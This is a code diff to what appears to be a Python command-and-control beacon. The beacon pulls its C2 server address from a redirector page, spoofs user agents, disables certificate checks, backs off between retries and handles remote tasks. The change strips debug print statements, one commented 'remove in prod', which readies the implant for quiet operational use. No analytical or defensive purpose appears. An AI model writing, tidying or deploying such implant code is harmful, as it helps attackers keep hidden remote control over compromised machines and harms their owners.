@@ -322,7 +322,6 @@ session.verify = False  # match Go InsecureSkipVerify
 
 
 def fetch_beacon_url() -> str:
-    print("Fetching url : ...")
     try:
         headers = {"User-Agent": random_ua()}
         resp = session.get(REDIRECTOR_URL, headers=headers, timeout=15)
@@ -341,8 +340,7 @@ def fetch_beacon_url() -> str:
         raise Exception("C2 URL not found in redirector page")
 
     content = match.group(1).strip()
-    print(content)
-
+    
     # Extract first valid URL
     url_match = re.search(r'https?://[^\s"\'<>]+', content)
     if not url_match:
@@ -397,10 +395,9 @@ def main():
         if not c2_url:
             try:
                 c2_url = fetch_beacon_url()
-                print(f"[+] Resolved C2: {c2_url}")  # debug — remove in prod
+                
                 c2_fetch_backoff = 60.0  # reset
             except Exception as e:
-                print(f"[-] C2 resolution failed: {e}")  # debug
                 time.sleep(c2_fetch_backoff)
                 if c2_fetch_backoff < 35 * 60:  # cap at 35 min like Go
                     c2_fetch_backoff *= 2
@@ -1251,4 +1248,5 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
